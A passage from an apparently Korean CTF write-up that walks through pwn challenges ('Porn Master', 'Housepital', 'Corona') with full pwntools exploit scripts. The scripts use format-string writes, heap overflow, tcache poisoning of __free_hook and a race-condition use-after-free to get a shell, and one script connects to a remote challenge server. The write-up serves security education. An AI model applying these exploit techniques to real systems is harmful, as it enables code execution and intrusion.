<span class="n">p</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">"sh# "</span><span class="p">,</span> <span class="s">f"vim /bin/sh"</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"#"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">b"i"</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span> <span class="o">+</span> <span class="n">e</span><span class="p">.</span><span class="n">symbols</span><span class="p">[</span><span class="s">'system'</span><span class="p">]))</span>
<span class="n">p</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">"#"</span> <span class="o">*</span> <span class="mh">0x10</span><span class="p">)</span>
<span class="n">p</span><span class="p">.</span><span class="n">sendline</span><span class="p">(</span><span class="s">":q"</span><span class="p">)</span>
<span class="n">free</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>

<span class="n">p</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><br></p>

<p><br></p>

<h2 id="porn-master">
<a class="anchor" href="#porn-master" aria-hidden="true"><span class="octicon octicon-link"></span></a>Porn Master</h2>

<hr>

<p><img src="/assets/bob/bob969.png" alt="/assets/bob/bob969.png"></p>

<p>Format String Bug를 이용한 stack 영역 변조 및 쉘 획득 (glibc 2.27)</p>

<ul>
  <li>보호기법</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Canary                        : ✓
NX                            : ✓
PIE                           : ✓
Fortify                       : ✘
RelRO                         : Full
</code></pre></div></div>

<ul>
  <li>실행결과</li>
</ul>

<p><img src="/assets/bob/bob970.png" alt="/assets/bob/bob970.png"></p>

<ul>
  <li>코드확인</li>
  <li>사용자에게 name 을 0x64 사이즈만큼 입력을 받으며 힙 영역에 저장을 한다.</li>
  <li>또한, 사용자에게 0x18 사이즈만큼 입력을 받아 스택에 저장하며, 입력과 출력을 각 2번씩 수행하는 것을 확인할 수 있다. 해당영역에서 <code class="highlighter-rouge">FSB</code> 취약점이 발생하는 것을 확인할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob971.png" alt="/assets/bob/bob971.png"></p>

<ul>
  <li>취약점이 발생하는 <code class="highlighter-rouge">printf</code> 에 브레이크포인트 지정 후 디버거 확인</li>
  <li>디버거를 통해 스택을 확인할 시 <code class="highlighter-rouge">0x00007ffd8e961198</code> 주소가 <code class="highlighter-rouge">0x00007ffd8e96118c</code> (변수 i)를 가리키는 포인터 변수(idx)인 것을 확인할 수 있다. 즉, 해당영역을 FSB를 통해 변조할 시 무제한으로 입출력 할 수 있다.</li>
  <li>따라서, stack 및 libc leak 이후 ret 를 oneshot 으로 변조하여 exploit 할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob972.png" alt="/assets/bob/bob972.png"></p>

<ul>
  <li>exploit code</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">bi</span> <span class="o">=</span> <span class="s">'./pwn'</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">bi</span><span class="p">])</span>
<span class="c1">#r = remote('localhost', 12002)
</span>
<span class="k">def</span> <span class="nf">reset</span><span class="p">():</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="s">'%11$n'</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">pay</span> <span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="s">'gpsfly'</span><span class="p">)</span>

<span class="n">pay</span> <span class="o">=</span> <span class="s">'%17$p'</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">pay</span> <span class="p">)</span>
<span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0x21b97</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc @ {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)))</span>
<span class="n">reset</span><span class="p">()</span>

<span class="n">pay</span> <span class="o">=</span> <span class="s">'%11$p'</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="n">stack</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">(),</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="mh">0xc</span> <span class="o">+</span> <span class="mh">0x48</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"stack @ {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">stack</span><span class="p">)))</span>
<span class="n">reset</span><span class="p">()</span>

<span class="n">oneshot</span> <span class="o">=</span> <span class="n">libc</span><span class="o">+</span><span class="mh">0x4f2c5</span>
<span class="n">oneshot</span> <span class="o">=</span> <span class="n">p64</span><span class="p">(</span><span class="n">oneshot</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">6</span><span class="p">):</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="s">'%{}c%14$hhn'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">ord</span><span class="p">(</span><span class="n">oneshot</span><span class="p">[</span><span class="n">i</span><span class="p">]))</span>
    <span class="n">pay</span> <span class="o">=</span> <span class="n">pay</span><span class="p">.</span><span class="n">ljust</span><span class="p">(</span><span class="mh">0x10</span><span class="p">,</span><span class="s">'A'</span><span class="p">)</span>
    <span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">stack</span><span class="o">+</span><span class="n">i</span><span class="p">)[:</span><span class="mi">6</span><span class="p">]</span>
    <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
    <span class="n">reset</span><span class="p">()</span>

<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">'&gt; '</span><span class="p">,</span><span class="s">''</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<p><br></p>

<p><br></p>

<h2 id="housepital">
<a class="anchor" href="#housepital" aria-hidden="true"><span class="octicon octicon-link"></span></a>Housepital</h2>

<hr>

<p><img src="/assets/bob/bob973.png" alt="/assets/bob/bob973.png"></p>

<ul>
  <li>보호기법</li>
</ul>

<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Canary                        : ✓
NX                            : ✓
PIE                           : ✓
Fortify                       : ✘
RelRO                         : Full
</code></pre></div></div>

<ul>
  <li>실행결과</li>
  <li>해당 바이너리는 <code class="highlighter-rouge">add</code>, <code class="highlighter-rouge">view</code>, <code class="highlighter-rouge">delete</code> 3가지 기능이 있으며 힙 영역에 메모리를 할당하여 쓰고, 읽고, 해제할 수 있다.</li>
</ul>

<p><img src="/assets/bob/bob974.png" alt="/assets/bob/bob974.png"></p>

<ul>
  <li>구조체 확인</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">struct</span> <span class="n">Patient</span>
<span class="p">{</span>
    <span class="n">char</span> <span class="n">name</span><span class="p">[</span><span class="mh">0x24</span><span class="p">];</span> <span class="c1"># 24 bytes
</span>    <span class="n">unsigned</span> <span class="nb">int</span> <span class="n">age</span><span class="p">;</span> <span class="c1"># 4 bytes
</span>    <span class="n">size_t</span> <span class="n">gender</span><span class="p">;</span> <span class="c1"># 8 bytes
</span>    <span class="n">char</span> <span class="o">*</span><span class="n">sickness</span><span class="p">;</span> <span class="c1"># 8 bytes
</span><span class="p">};</span>
</code></pre></div></div>

<ul>
  <li>취약점 확인 (add function)</li>
  <li>25 line 에 scanf 함수 호출 시 <code class="highlighter-rouge">%lld</code> 포맷은 8 바이트 입력을 받으며, patient_list[i]→age 변수는 unsigned int (4 바이트)형 변수 이므로 해당 코드에서 <code class="highlighter-rouge">Type Confusion</code> 이 발생한다.</li>
  <li>이를 통해 아래 26 line 및 47 line 을 통해 0x40 chunk 를 할당받아 0x80 사이즈 만큼 입력을 받는 등 <code class="highlighter-rouge">Heap Overflow</code>로 악용 가능하다.</li>
</ul>

<p><img src="/assets/bob/bob975.png" alt="/assets/bob/bob975.png"></p>

<ul>
  <li>exploit plan
    <ol>
      <li>
        <p>libc leak</p>

        <p>1.1. 0x420 이상의 청크를 만든 뒤 free 하여 <code class="highlighter-rouge">unsorted bin</code> (libc-main_arena) 생성</p>

        <p>1.2. view 메뉴를 통해 libc 주소 leak</p>
      </li>
      <li>
        <p>rip 변조</p>

        <p>2.1. tcache bin 의 fd 를 <code class="highlighter-rouge">__malloc_hook</code> 또는 <code class="highlighter-rouge">__free_hook</code> 주소로 변조</p>

        <p>2.2. tcache chunk 할당 시 <code class="highlighter-rouge">oneshot</code> 또는 <code class="highlighter-rouge">system</code> 주소로 변조</p>

        <p>2.3. malloc 또는 free 함수를 호출하여 트리거</p>

        <ul>
          <li>__free_hook 을 system 주소로 변조 하였을 경우 힙 메모리에 <code class="highlighter-rouge">"/bin/sh"</code> 문자열 저장 후 호출</li>
        </ul>
      </li>
    </ol>
  </li>
  <li>exploit code</li>
</ul>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>

<span class="n">bi</span> <span class="o">=</span> <span class="s">'./pwn'</span>
<span class="n">r</span> <span class="o">=</span> <span class="n">process</span><span class="p">([</span><span class="n">bi</span><span class="p">])</span>
<span class="c1">#r = remote('localhost', 12003)
</span><span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">bi</span><span class="p">)</span>
<span class="n">l</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'libc.so.6'</span><span class="p">)</span>
<span class="n">xla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
<span class="n">xa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span><span class="p">(</span><span class="s">': '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
<span class="n">add</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span><span class="p">,</span><span class="n">gender</span><span class="p">,</span><span class="n">age</span><span class="p">,</span><span class="n">sickness</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="s">'1'</span><span class="p">),</span> <span class="n">xa</span><span class="p">(</span><span class="n">name</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">gender</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">age</span><span class="p">),</span> <span class="n">xa</span><span class="p">(</span><span class="n">sickness</span><span class="p">)]</span>
<span class="n">view</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">idx</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="s">'2'</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">idx</span><span class="p">)]</span>
<span class="n">dele</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">idx</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="s">'3'</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">idx</span><span class="p">)]</span>

<span class="p">[</span><span class="n">add</span><span class="p">(</span><span class="s">'Z'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">)]</span>

<span class="n">add</span><span class="p">(</span><span class="s">'Z'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span>
<span class="p">[</span><span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="p">,</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">5</span><span class="p">)]</span>
<span class="n">add</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="n">p64</span><span class="p">(</span><span class="mh">0x31</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="s">'A'</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x40</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x421</span><span class="p">)</span>
<span class="n">add</span><span class="p">(</span><span class="s">'Z'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000000ff</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">3</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x50</span>
<span class="n">add</span><span class="p">(</span><span class="s">'Z'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000000ff</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>
<span class="n">view</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">r</span><span class="p">.</span><span class="n">recvuntil</span><span class="p">(</span><span class="s">'sickness : {}'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="s">'A'</span><span class="o">*</span><span class="mh">0x50</span><span class="p">))</span>
<span class="n">libc</span> <span class="o">=</span> <span class="n">u64</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">().</span><span class="n">ljust</span><span class="p">(</span><span class="mi">8</span><span class="p">,</span><span class="s">'</span><span class="se">\x00</span><span class="s">'</span><span class="p">))</span> <span class="o">-</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__malloc_hook'</span><span class="p">]</span> <span class="o">-</span> <span class="mh">0x70</span>
<span class="n">log</span><span class="p">.</span><span class="n">info</span><span class="p">(</span><span class="s">"libc @ {}"</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="nb">hex</span><span class="p">(</span><span class="n">libc</span><span class="p">)))</span>

<span class="n">dele</span><span class="p">(</span><span class="mi">2</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">4</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">5</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">6</span><span class="p">)</span>

<span class="n">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">=</span> <span class="s">'A'</span><span class="o">*</span><span class="mh">0x40</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span> <span class="o">+</span> <span class="n">p64</span><span class="p">(</span><span class="mh">0x41</span><span class="p">)</span>
<span class="n">pay</span> <span class="o">+=</span> <span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">+</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'__free_hook'</span><span class="p">])</span>
<span class="n">add</span><span class="p">(</span><span class="s">'Z'</span><span class="p">,</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0x1000000ff</span><span class="p">,</span> <span class="n">pay</span><span class="p">)</span>

<span class="p">[</span><span class="n">add</span><span class="p">(</span><span class="n">p64</span><span class="p">(</span><span class="n">libc</span><span class="o">+</span><span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'system'</span><span class="p">]),</span> <span class="mi">0</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="s">'/bin/sh'</span><span class="p">)</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">2</span><span class="p">)]</span>
<span class="n">dele</span><span class="p">(</span><span class="mi">1</span><span class="p">)</span>

<span class="n">r</span><span class="p">.</span><span class="n">interactive</span><span class="p">()</span>
</code></pre></div></div>

<ul>
  <li>추가적으로, 개발 실수로 인해 add 함수에 힙 메모리 할당 시 해당 영역으로 초기화(memset 또는 calloc) 하지 않아 <code class="highlighter-rouge">Uninitialized Heap</code> 버그가 존재하니 해당 버그를 이용하여 exploit 해보는것도 추천한다.</li>
</ul>

<p><br></p>

<p><br></p>

<h2 id="corona">
<a class="anchor" href="#corona" aria-hidden="true"><span class="octicon octicon-link"></span></a>Corona</h2>

<hr>

<p><img src="/assets/bob/bob976.png" alt="/assets/bob/bob976.png"></p>

<p>race condition을 이용한 thread heap exploit challenge.</p>

<h3 id="challenge">Challenge</h3>

<p>사용할 수 있는 메뉴는 아래와 같다.</p>

<ol>
  <li>Create house : house structure 할당</li>
  <li>Edit house : house name 수정</li>
  <li>Add person : person structure 할당</li>
  <li>Check status : person 상태 출력</li>
  <li>hidden : person name 수정 (한번만 호출 가능)</li>
</ol>

<p>또한 프로그램에는 두개의 thread가 동작하고 있다.</p>

<ol>
  <li>t_virus : 랜덤(3 + rand()%8)으로 사람을 한명 감염시키고 person chunk를 free 한다.</li>
  <li>t_day_check : 5초에 한번씩 하루가 지나며 하루가 지날 때 마다 감염된 person 객체를 null로 덮어쓴다.</li>
</ol>

<h3 id="vulnerability">Vulnerability</h3>

<p>취약점은 race condition으로, t_virus 쓰레드가 person chunk를 free한 후 t_day_check 쓰레드가 person list를 free하기 전에 free된 person 에 접근하면 Use-After-Free 취약점이 발생한다.</p>

<h3 id="exploit-1">Exploit</h3>

<p>exploit에 앞서 이 문제를 최대한 빠르게 exploit하기 위해 알고있어야하는 두가지가 있다.</p>

<ol>
  <li>바이너리에서 chunk를 free하는게 자유롭지 않다. t_virus thread가 랜덤으로 free하는데, list에 chunk가 없을 경우 free되지 않을 수도 있다. 따라서 chunk를 최대한 높은 확률로 free시키기 위해서는 모든 house에 person을 전부 채우고 free 될 때 출력되는 메세지로 어떤 청크가 free된건지 구분하는게 좋다 (<code class="highlighter-rouge">printf("\n%s was infected ...\n", house_list[rd]-&gt;list[i]-&gt;name);</code>)
그래서 exploit을 작성할 때도 특수한 chunk가 free되는걸 가정하기 보다, 단순히 chunk가 free되는 사실을 이용해 코드를 작성해야 한다. 그렇지 않으면 랜덤 때문에 디버깅이 매우 힘들고 exploit을 완성하는데 오랜 시간이 걸릴 것이다.</li>
  <li>race를 내는 시간이 너무 길다. t_day_check가 5초이고 t_virus가 (rand()%8 + 3)초인데 사실상 chunk 하나가 free되기 위해서는 최소 3초를 기다려야한다는 말이 된다. 문제를 풀 때는 바이너리 패치로 이 값을 짧게 줄여서 exploit해야 디버깅하는데 시간을 최소화할 수 있다.</li>
</ol>

<p>아마 위 두가지를 안했다면 디버깅이 매우 불편했을 것이다. 다음은 실제로 exploit하는 순서이다.</p>

<ol>
  <li>5일째에 libc leak을 제공해 준다.</li>
  <li>t_virus로 8개의 chunk를 free한다. (7개의 chunk는 tcache에 저장되며 마지막 chunk는 fastbin에 저장된다.)</li>
  <li>hidden 메뉴를 이용해 fastbin chunk의 fd를 free hook - 0x10으로 돌린다. (race condition 트리거)</li>
  <li>동일한 사이즈의 청크를 하나 더 할당하면 fastbin chunk를 tcache bin 으로 옮긴다.</li>
  <li>tcache bin에 있는 chunk를 할당받아 free_hook에 원하는 값을 쓴다.</li>
  <li>person name에 /bin/sh를 넣어 t_virus가 chunk를 free할 때 shell을 획득한다.</li>
</ol>

<h3 id="note">Note</h3>

<p>사실 이 문제를 처음 기획했을때 핵심적인 내용은 libc 주소를 leak하는 부분이었다. 다만 libc를 leak하는 방법이 생각보다 너무 어려워져서 이것과 함께 tcache bin trick을 같이 낸다면 푸는데 너무 많은 시간이 걸릴것이라 판단했다. 그래서 libc 주소를 주는 방향으로 문제를 변경했고, exploit에서 안쓰는 edit house 메뉴가 있는 이유도 leak을 주는걸로 패치해서 그렇다. (하지만 지금 문제에서도 libc leak을 할 수 있으니 도전해보고 싶으신 분들은 도전해 보시길..)</p>

<p>그리고 exploit의 핵심적인 내용 중에 tcache 관련 트릭이 있는데, 사실 이것은 공개적으로 알려지거나 흔히 사용되는 트릭은 아닌 만큼 fastbin bin에 있는 chunk가 tcache으로 옮겨진다는 사실을 모르는 분들이 많을 것이라 생각했다. 특히 CTF에서 heap 관련 문제는 모르는 트릭이 나와 고생하는 경우가 많은데, 이 문제에서는 트릭을 몰라도 자연스럽게 문제를 풀 수 있도록 최대한 유도했다.</p>

<p>그 부분이 바로 Person chunk를 0x70 사이즈의 chunk로 줬다는 사실인데, exploit에서 tcache bin 트릭을 사용하면 사이즈와는 상관 없이 원하는 주소를 덮어 쓸 수 있다. 하지만 이 사실을 모르는 분들은 이미 흔하게 알려진 0x70 fastbin chunk의 fd를 덮어 __malloc_hook을 덮어쓰는 exploit을 생각했을 것이다. 만약 이런 생각을 통해 exploit을 작성했다 하더라도 __malloc_hook을 덮어쓰는 과정에서 자연스럽게 fastbin chunk가 tcache bin으로 옮겨지는 사실을 확인할 수 있을 것이다. 여기서 좀만 더 디버깅을 하다 보면 exploit을 완성할 수 있도록 문제를 설계했다. 그래서 이 문제를 푸는 모든 분들이 모르면 못푸는 트릭문제라고 생각하지 않았으면 좋겠다는 마음으로 최대한 익스 유도를 해봤다.</p>

<h3 id="exploit-code">Exploit Code</h3>

<p>실수로 문제 코드와 exploit을 다 날려버린 바람에,, 문제를 크로스 체킹 해주신 핵심연구팀 김동민님(@gpsfly) 익스를 첨부한다.</p>

<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">from</span> <span class="nn">pwn</span> <span class="kn">import</span> <span class="o">*</span>
<span class="kn">import</span> <span class="nn">sys</span>

<span class="n">bi</span> <span class="o">=</span> <span class="s">'./bin.elf'</span>
<span class="c1">#r = process([bi])
</span><span class="n">r</span> <span class="o">=</span> <span class="n">remote</span><span class="p">(</span><span class="s">'bob.lordofpwn.kr'</span><span class="p">,</span> <span class="mi">31337</span><span class="p">)</span>
<span class="n">context</span><span class="p">.</span><span class="n">terminal</span> <span class="o">=</span> <span class="p">[</span><span class="s">'tmux'</span><span class="p">,</span> <span class="s">'new-window'</span><span class="p">]</span>
<span class="n">sla</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">sendlineafter</span>
<span class="n">sa</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">sendafter</span>
<span class="n">p</span> <span class="o">=</span> <span class="n">pause</span>
<span class="n">dbg</span> <span class="o">=</span> <span class="n">gdb</span><span class="p">.</span><span class="n">attach</span>
<span class="n">e</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="n">bi</span><span class="p">)</span>
<span class="n">l</span> <span class="o">=</span> <span class="n">ELF</span><span class="p">(</span><span class="s">'libc'</span><span class="p">)</span> <span class="c1"># remote
#l = ELF('libc.so.6') # local
</span>
<span class="n">sc</span> <span class="o">=</span> <span class="s">'''
heap-analysis-helper
c
'''</span>
<span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="p">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">1</span><span class="p">:</span>
    <span class="n">dbg</span><span class="p">(</span><span class="n">r</span><span class="p">,</span> <span class="n">sc</span><span class="p">)</span>

<span class="n">xla</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">sla</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
<span class="n">xa</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">x</span> <span class="p">:</span> <span class="n">sa</span><span class="p">(</span><span class="s">'&gt;&gt; '</span><span class="p">,</span> <span class="nb">str</span><span class="p">(</span><span class="n">x</span><span class="p">))</span>
<span class="n">create</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">name</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="mi">1</span><span class="p">),</span> <span class="n">xa</span><span class="p">(</span><span class="n">name</span><span class="p">)]</span>
<span class="n">edit</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">idx</span><span class="p">,</span><span class="n">name</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="mi">2</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">idx</span><span class="p">),</span> <span class="n">xa</span><span class="p">(</span><span class="n">name</span><span class="p">)]</span>
<span class="n">add</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">idx</span><span class="p">,</span><span class="n">name</span><span class="p">,</span><span class="n">age</span><span class="p">,</span><span class="n">height</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="mi">3</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">idx</span><span class="p">),</span> <span class="n">xa</span><span class="p">(</span><span class="n">name</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">age</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">height</span><span class="p">)]</span>
<span class="n">check</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">idx</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="mi">4</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">idx</span><span class="p">)]</span>
<span class="n">hidden</span> <span class="o">=</span> <span class="k">lambda</span> <span class="n">hidx</span><span class="p">,</span><span class="n">pidx</span><span class="p">,</span><span class="n">name</span> <span class="p">:</span> <span class="p">[</span><span class="n">xla</span><span class="p">(</span><span class="mi">31337</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">hidx</span><span class="p">),</span> <span class="n">xla</span><span class="p">(</span><span class="n">pidx</span><span class="p">),</span> <span class="n">xa</span><span class="p">(</span><span class="n">name</span><span class="p">)]</span>

<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">7</span><span class="p">):</span>
    <span class="n">create</span><span class="p">(</span><span class="s">'/bin/sh'</span><span class="p">)</span>
    <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">8</span><span class="p">):</span>
        <span class="n">add</span><span class="p">(</span><span class="n">i</span><span class="p">,</span> <span class="s">'{}_{};/bin/sh'</span><span class="p">.</span><span class="nb">format</span><span class="p">(</span><span class="n">i</span><span class="p">,</span><span class="n">j</span><span class="p">),</span> <span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">)</span>

<span class="n">cnt</span> <span class="o">=</span> <span class="mi">0</span>
<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
    <span class="n">data</span> <span class="o">=</span> <span class="n">r</span><span class="p">.</span><span class="n">recvline</span><span class="p">().</span><span class="n">strip</span><span class="p">()</span>
    <span class="k">if</span> <span class="s">'The gift'</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
        <span class="n">libc</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">.</span><span class="n">split</span><span class="p">(</span><span class="s">' : '</span><span class="p">)[</span><span class="mi">1</span><span class="p">],</span> <span class="mi">16</span><span class="p">)</span> <span class="o">-</span> <span class="n">l</span><span class="p">.</span><span class="n">sym</span><span class="p">[</span><span class="s">'printf'</span><span class="p">]</span>
